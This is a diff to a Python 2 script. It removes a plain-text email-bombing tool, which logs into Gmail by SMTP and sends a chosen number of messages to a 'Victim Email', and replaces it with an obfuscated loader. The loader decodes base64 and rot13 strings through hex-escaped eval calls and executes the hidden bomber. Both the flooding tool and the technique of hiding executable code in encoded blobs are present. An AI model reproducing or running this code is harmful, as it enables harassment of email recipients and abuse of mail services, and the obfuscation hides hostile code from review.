@@ -1,81 +1,8 @@
-# -*- coding: utf-8 -*-
-#=========================================================================================================================================
-
-import os
-import random
-import smtplib
-import sys
-import getpass
-import time
-# ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Welcome ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
-os.system('clear')
-print ('''
-\033[92m
-                                                        
-@@@@@@@@@@   @@@@@@@    @@@@@@   @@@@@@@@@@   @@@@@@@   
-@@@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  
-@@! @@! @@!  @@!  @@@  @@!  @@@  @@! @@! @@!  @@!  @@@  
-!@! !@! !@!  !@   @!@  !@!  @!@  !@! !@! !@!  !@   @!@  
-@!! !!@ @!@  @!@!@!@   @!@  !@!  @!! !!@ @!@  @!@!@!@   
-!@!   ! !@!  !!!@!!!!  !@!  !!!  !@!   ! !@!  !!!@!!!!  
-!!:     !!:  !!:  !!!  !!:  !!!  !!:     !!:  !!:  !!!  
-:!:     :!:  :!:  !:!  :!:  !:!  :!:     :!:  :!:  !:!  
-:::     ::    :: ::::  ::::: ::  :::     ::    :: ::::  
- :      :    :: : ::    : :  :    :      :    :: : ::   
-                                                        
-
-                       ©copyright by \033[93mEngine Ripper \033[97m
-
-''')
-print(" ")
-
-# ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■  Information ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
-
-# ■■■■■■■■■■■■■■■■■■■ Please, On Your Less Secure Option From Gmail ■■■■■■■■■■■■■■■■■
-
-
-user = raw_input('\033[92mYour \033[92mGmail\033[97m :\033[94m ')
-Password = getpass.getpass('\033[92mYour \033[92mPassword\033[97m :\033[94m ')
-print(" ")
-sender = raw_input('\033[91mTo Victim \033[91mEmail\033[97m : \033[94m')
-message = raw_input('\033[92mYour \033[92mMessage\033[97m : \033[94m')
-print(" ")
-color = input('\033[92mNumber of \033[92msend\033[97m : \033[94m')
-print(" ")
-print("\033[94m📮\033[92mSending : ")
-
-
-############################### SMTP_SERVER INFO ##################
-smtp_server = 'smtp.gmail.com'
-port = 587
-
-##########################  Login ############################
-try:
-    server = smtplib.SMTP(smtp_server,port) 
-    server.ehlo()
-
-    if smtp_server == "smtp.gmail.com":
-            server.starttls()
-    server.login(user,Password)
-
-#■■■■■■■■■■■■■■■■■■■■■■■■■■■ Sending ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
-
-    for i in range(1, color+1):
-        subject = os.urandom(9)
-        message = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
-        server.sendmail(user, sender, message)
-        print ("\033[94m☑\033[97m Email \033[92mSENT\033[97m  :\033[93m %i") % i
-        sys.stdout.flush()
-    server.quit()
-    print ('\033[93m☑\033[97m All \033[97mMessage was\033[92m sent\033[97m ')
-    
-    
-except KeyboardInterrupt:
-    print ('[✘] Canceled')
-    sys.exit()
-except smtplib.SMTPAuthenticationError:
-    print(" ")
-    print("\033[94m⚠️\033[91mError \033[97m:")
-    print ('\033[94m⚠️\033[97mThe \033[93musername \033[97mor \033[93mpassword \033[97myou entered is incorrect.')
-    print ("\033[94m⚠️\033[91mCheck if the Options of 'Applications are less secure' is enabled\nCheck at https://myaccount.google.com/lesssecureapps")
-    sys.exit()
+import base64, codecs
+magic = 'IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KDQppbXBvcnQgb3MNCmltcG9ydCByYW5kb20NCmltcG9ydCBzbXRwbGliDQppbXBvcnQgc3lzDQppbXBvcnQgZ2V0cGFzcw0KaW1wb3J0IHRpbWUNCiMg4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pagIFdlbGNvbWUg4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pag4pagDQpvcy5zeXN0ZW0oJ2NsZWFyJykNCnByaW50ICgnJycNClwwMzNbOTJtDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KQEBAQEBAQEBAQCAgIEBAQEBAQEAgICAgQEBAQEBAICAgQEBAQEBAQEBAQCAgIEBAQEBAQEAgICANCkBAQEBAQEBAQEBAICBAQEBAQEBAQCAgQEBAQEBAQEAgIEBAQEBAQEBAQEBAICBAQEBAQEBAQCAgDQpAQCEgQEAhIEBAISAgQEAhICBAQEAgIEBAISAgQEBAICBAQCEgQEAhIEBAISAgQEAhICBAQEAgIA0KIUAhICFAISAhQCEgICFAICAgQCFAICAhQCEgIEAhQCAgIU'
+love = 'NuVPSNVFNuDPRtVPSNVPNtDPSNVPNAPxNuVFNuVHNtDPSNVPONVHNuDPSNVPNtDPSNVPNuDPRtVRNuVFNuVHNtDPSNVPONVHNuDPSNVPNtQDbuDPRtVPNuVPSNVFNtVFRuDPRuVFRtVPSNVFNtVFRuVPNuDPRtVPNuVPSNVFNtVFRuDPRuVFRtVN0XVFR6VPNtVPNuVGbtVPRuBvNtVFRuVPNuVGbtVPRuVFNtVFR6VPNtVPNuVGbtVPRuBvNtVFRuVPNAPwbuBvNtVPNtBvR6VPN6VGbtVPR6VFNtBvR6VPNuBvRtVQbuBvNtVPNtBvR6VPN6VGbtVPR6VFNtQDb6BwbtVPNtVQb6VPNtVQb6VQb6BwbtVQb6Bwb6VQb6VPN6BwbtVPNtVQb6VPNtVQb6VQb6BwbtVN0XVQbtVPNtVPN6VPNtVQb6VQbtBwbtVPNtBvN6VPN6VPNtVQbtVPNtVPN6VPNtVQb6VQbtBwbtVPNAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtQDbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtjdywo3O5pzyanUDtLaxtKQNmZ1f5Z21SozqcozHtHzyjpTIlVSjjZmAoBGqgQDbAPvpaWlxAPaOlnJ50XPVtVvxAPt0XVlQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydQvydNtVRyhMz9loJS0nJ9hVBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbN0XQDbwVBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbPODoTIup2HfVR9hVSyiqKVtGTImplOGMJA1pzHtG3O0nJ9hVRMlo20tE21unJjt4cnt4cnt4cnt4cnt4cnt4cnt4cnt4cnt4cnt4cnt4cnt4cnt4cnt4cnt4cnt4cnt4cntQDbAPt0XqKAypvN9VUWuq19coaO1qPtaKQNmZ1f5Zz1Mo3IlVSjjZmAoBGWgE21u'
+god = 'aWxcMDMzWzk3bSA6XDAzM1s5NG0gJykNClBhc3N3b3JkID0gZ2V0cGFzcy5nZXRwYXNzKCdcMDMzWzkybVlvdXIgXDAzM1s5Mm1QYXNzd29yZFwwMzNbOTdtIDpcMDMzWzk0bSAnKQ0KcHJpbnQoIiAiKQ0Kc2VuZGVyID0gcmF3X2lucHV0KCdcMDMzWzkxbVRvIFZpY3RpbSBcMDMzWzkxbUVtYWlsXDAzM1s5N20gOiBcMDMzWzk0bScpDQptZXNzYWdlID0gcmF3X2lucHV0KCdcMDMzWzkybVlvdXIgXDAzM1s5Mm1NZXNzYWdlXDAzM1s5N20gOiBcMDMzWzk0bScpDQpwcmludCgiICIpDQpjb2xvciA9IGlucHV0KCdcMDMzWzkybU51bWJlciBvZiBcMDMzWzkybXNlbmRcMDMzWzk3bSA6IFwwMzNbOTRtJykNCnByaW50KCIgIikNCnByaW50KCJcMDMzWzk0bfCfk65cMDMzWzkybVNlbmRpbmcgOiAiKQ0KDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgU01UUF9TRVJWRVIgSU5GTyAjIyMjIyMjIyMjIyMjIyMjIyMNCnNtdHBfc2VydmVyID0gJ3NtdHAuZ21haWwuY29tJw0KcG9ydCA9IDU4Nw0KDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyAgTG9naW4gIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KdHJ5Og0KICAgIHNlcnZlciA9IHNtdHBsaWIuU01UUChzbXRwX3NlcnZlcixwb3J0KSANCiAgICBzZXJ2ZXIuZWhsbygpDQoNCiAgICBpZiBzbXRwX3NlcnZlciA9PSAic210cC5nbWFpbC5jb20iOg0KICAgICAgICAgICAgc2VydmVyLnN0YXJ0dGxzKCkNCiAgICBzZXJ2ZXIubG9naW4odXNlcixQYXNzd29yZCkNCg0KI+KWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoCBTZW5kaW5nIOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoOKWoO'
+destiny = 'XJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbBXJbN0XQDbtVPNtMz9lVTxtnJ4tpzShM2HbZFjtL29fo3VeZFx6QDbtVPNtVPNtVUA1LzcyL3DtCFOipl51pzShMT9gXQxcQDbtVPNtVPNtVT1yp3AuM2HtCFNaEaWioGbtWlNeVUImMKVtXlNaKT5GqJWdMJA0BvNaVPftp3IvnzIwqPNeVPqpovptXlOgMKAmLJqyQDbtVPNtVPNtVUAypaMypv5mMJ5xoJScoPu1p2IlYPOmMJ5xMKVfVT1yp3AuM2HcQDbtVPNtVPNtVUOlnJ50VPtvKQNmZ1f5AT3vzWSpZQZmJmx3oFOSoJScoPOpZQZmJmxloIASGyEpZQZmJmx3oFNtByjjZmAoBGAgVPIcVvxtWFOcQDbtVPNtVPNtVUA5pl5mqTEiqKDhMzk1p2tbXD0XVPNtVUAypaMypv5kqJy0XPxAPvNtVPOjpzyhqPNbW1jjZmAoBGAg4cvEKQNmZ1f5A20tDJkfVSjjZmAoBGqgGJImp2SaMFO3LKApZQZmJmxloFOmMJ50KQNmZ1f5A20tWlxAPvNtVPNAPvNtVPNAPzI4L2IjqPOYMKyvo2SlMRyhqTIlpaIjqQbAPvNtVPOjpzyhqPNbW1ivaWuqVRAuozAyoTIxWlxAPvNtVPOmrKZhMKucqPtcQDcyrTAypUDtp210pTkcLv5GGIEDDKI0nTIhqTywLKEco25SpaWipwbAPvNtVPOjpzyhqPtvVPVcQDbtVPNtpUWcoaDbVyjjZmAoBGEg4cdt77vCKQNmZ1f5ZJ1SpaWipvOpZQZmJmx3oGbvXD0XVPNtVUOlnJ50VPtaKQNmZ1f5AT3vzdQihV9pZQZmJmx3oIEbMFOpZQZmJmxmoKImMKWhLJ1yVSjjZmAoBGqgo3VtKQNmZ1f5Z21jLKAmq29lMPOpZQZmJmx3oKyiqFOyoaEypzIxVTymVTyhL29lpzIwqP4aXD0XVPNtVUOlnJ50VPtvKQNmZ1f5AT3vzdQihV9pZQZmJmxkoHAbMJAeVTyzVUEbMFOCpUEco25mVT9zVPqOpUOfnJAuqTyioaZtLKWyVTkyp3Ztp2IwqKWyWlOcplOyozSvoTIxKT5QnTIwnlOuqPObqUEjpmbiY215LJAwo3IhqP5ao29aoTHhL29gY2kyp3AmMJA1pzIupUOmVvxAPvNtVPOmrKZhMKucqPtcQDb='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
